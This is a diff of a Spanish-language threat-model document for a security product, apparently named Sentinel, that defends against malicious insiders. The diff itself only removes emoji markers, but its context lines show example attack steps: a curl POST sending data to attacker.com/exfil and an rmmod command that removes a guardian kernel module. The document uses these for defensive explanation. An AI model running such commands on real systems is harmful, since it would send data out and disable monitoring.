@@ -6,7 +6,7 @@
 
 ---
 
-## 🎯 El Problema: Insider Threat
+##  El Problema: Insider Threat
 
 ### Definición
 **Usuario interno malicioso**: Persona con acceso legítimo que abusa de sus privilegios para:
@@ -133,7 +133,7 @@ rmmod guardian_alpha  # Remover módulo kernel
    - Filesystem inmutable (squashfs)
    - Requiere reboot para modificar
 
-**Resultado**: ⚠️ Ataque difícil, ✅ Detección garantizada
+**Resultado**: ⚠ Ataque difícil, ✅ Detección garantizada
 
 ---
 
@@ -174,7 +174,7 @@ curl -X POST https://attacker.com/exfil \
 | **Deshabilitar logging** | ✅ Posible | ❌ Bloqueado (WAL + eBPF) | **100%** |
 | **Deshabilitar monitoring** | ✅ Posible | ❌ Detectado (Mutual surveillance) | **100%** |
 | **Borrar evidencia** | ✅ Posible | ❌ no factible (Immutable audit trail) | **100%** |
-| **Modificar kernel** | ✅ Posible | ⚠️ Detectado (LSM hooks) | **90%** |
+| **Modificar kernel** | ✅ Posible | ⚠ Detectado (LSM hooks) | **90%** |
 | **Exfiltrar datos** | ✅ Posible | ❌ Bloqueado (Egress monitoring) | **95%** |
 | **Ejecutar malware** | ✅ Posible | ❌ Bloqueado (Seccomp + eBPF) | **100%** |
 
@@ -249,15 +249,15 @@ curl -X POST https://attacker.com/exfil \
 
 ---
 
-## 🎯 Diferenciador Competitivo
+##  Diferenciador Competitivo
 
 ### Sentinel vs Competencia en Insider Threat
 
 | Característica | Datadog | Splunk | Wiz | **Sentinel** |
 |----------------|---------|--------|-----|--------------|
 | **Dual-Guardian (Mutual surveillance)** | ❌ | ❌ | ❌ | ✅ |
-| **Kernel-level protection (eBPF)** | ⚠️ Agent | ⚠️ Agent | ❌ | ✅ |
-| **Immutable audit trail** | ⚠️ Parcial | ⚠️ Parcial | ❌ | ✅ |
+| **Kernel-level protection (eBPF)** | ⚠ Agent | ⚠ Agent | ❌ | ✅ |
+| **Immutable audit trail** | ⚠ Parcial | ⚠ Parcial | ❌ | ✅ |
 | **Auto-regeneration** | ❌ | ❌ | ❌ | ✅ |
 | **Pre-execution blocking** | ❌ | ❌ | ❌ | ✅ |
 
@@ -302,7 +302,7 @@ curl -X POST https://attacker.com/exfil \
 - ✅ Dual-Guardian protege contra admin malicioso
 - ✅ Immutable audit trail preserva evidencia
 - ✅ Mutual surveillance detecta sabotaje
-- ⚠️ Gaps identificados y mitigaciones planificadas
+- ⚠ Gaps identificados y mitigaciones planificadas
 
 **Valor agregado**: Sentinel no solo protege contra AIOpsDoom (externo), sino también contra **insider threats** (interno) - **doble valor**.
 
